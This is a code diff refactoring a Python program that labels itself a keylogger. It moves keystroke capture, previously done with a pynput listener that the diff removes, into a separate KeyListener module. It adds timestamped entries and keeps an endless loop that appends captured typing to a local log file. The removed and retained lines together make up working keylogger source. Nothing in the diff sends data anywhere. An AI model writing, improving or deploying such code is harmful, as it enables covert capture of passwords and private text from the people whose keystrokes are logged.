@@ -1,5 +1,5 @@
 import os
-from pynput import keyboard
+from datetime import datetime
 from key_listener import KeyListener
 
 # --------------------- CONSTANTS --------------------- #
@@ -25,12 +25,12 @@ def write_to_log(message: str, log_name: str) -> bool:
 
         if not os.path.exists(LOGS_DIR):
             os.makedirs(LOGS_DIR)
-            print(f"Directory {LOGS_DIR} created successfully!")
+            print("Directory {LOGS_DIR} created successfully!".format(LOGS_DIR=LOGS_DIR))
 
         # Create the log file if it doesn't exist
         if not os.path.exists(log_path):
-            with open(log_path, 'w'):
-                pass
+            with open(log_path, 'w') as f:
+                f.write('---- KEYLOGGER LOG ----\n')
 
         with open(log_path, 'a') as f:
             f.write(message)
@@ -39,47 +39,22 @@ def write_to_log(message: str, log_name: str) -> bool:
     except Exception as e:
         print(e)
         return False
+    
+def format_message(content: str) -> str:
+    date = 'DATE -> {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
+    sep = '\n# ---------------------------------------------- #\n'
 
-
-def read_keys(timeout=2) -> str:
-    """
-    Read and return a string formed by the keys pressed by the user.
-
-    Args:
-        timeout (int): The maximum duration (in seconds) to listen for keys.
-
-    Returns:
-        str: The string formed by the keys pressed.
-    """
-    keys = []
-
-    def on_press(key):
-        """
-        Adds the pressed key to the list of keys if it is a character key.
-
-        Parameters:
-            key (pynput.keyboard.Key): The pressed key.
-
-        Returns:
-            None
-        """
-        try:
-            keys.append(key.char)
-        except AttributeError:
-            pass
-
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join(timeout=timeout)
-
-    return ''.join(keys)
+    return '{date}{sep} {content}{sep}\n\n'.format(date=date, content=content, sep=sep)
 
 # --------------------- MAIN --------------------- #
 
 def main():
     while True:
         key_listener = KeyListener()
-        typed_keys = key_listener.read_keys(timeout=5)
-        write_to_log(typed_keys, LOG_FILE)
+        typed_keys = key_listener.read_keys()
+
+        message = format_message(typed_keys)
+        write_to_log(message, LOG_FILE)
 
 if __name__ == "__main__":
     main()
